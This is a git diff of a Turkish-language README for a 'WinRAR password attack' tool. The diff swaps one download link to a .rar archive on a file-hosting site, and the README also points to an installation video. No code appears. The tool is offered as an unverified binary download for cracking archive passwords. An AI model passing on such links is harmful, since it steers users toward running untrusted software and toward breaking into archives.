@@ -1,7 +1,7 @@
 # RelaX-WinRAR-Password-Attack
 Kullanımı Çok Basit Bir WinRAR Password Attack!
 
-İndirme Linki : 🔴 https://dosya.co/m2yxjivnmjwh/RelaX_WinRAR_Password_Attack.rar.html 🔴
+İndirme Linki : 🔴 https://dosya.co/afk61a0huium/RelaX_WinRAR_Password_Attack.rar.html 🔴
 
 ## 🌐〢 Kurulum Videosu
 https://streamable.com/8svwml
